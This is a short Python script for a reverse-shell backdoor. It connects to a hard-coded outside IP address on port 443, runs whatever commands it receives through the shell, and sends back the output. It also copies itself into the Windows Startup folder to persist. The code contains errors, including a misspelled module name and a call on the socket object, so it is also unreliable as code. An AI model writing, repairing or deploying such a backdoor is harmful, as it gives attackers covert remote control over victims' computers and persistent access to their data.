import socket
import subprocess
import threading
import time
import os


#Create two variables to receive the IP and Port of server

#Create a variable for standalone netcat receiver

IP = "170.64.134.190"
PORT = 443

#Create a function to keep persistence (keep connected when target turns off)

def autorun():
    # Define filename
    filen = os.path.basename(__file__)
    # Convert file to exe
    exe_file = filen.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))

#Create Connection function, try and connect to received message

def conn(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))        #Once connection recievd, attempts to connect.
        return client()
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        #Start process
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subrpocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()        #Read errors
        client.send(output + b"\n")

    except Exception as error:
        print(error)

#Create and keep connection alive while sending and recieving

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:exit":
                return
            else:
                threading.Thread(target=cmd, args=(client, data)).start() #Start and keep connection alive

    except Exception as error:
        client.close()


#Main branch to import functions

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(IP, PORT)
        if client:
            cli(client)
        else:
            time.sleep(3) #Checks for incoming connections every 3 seconds.





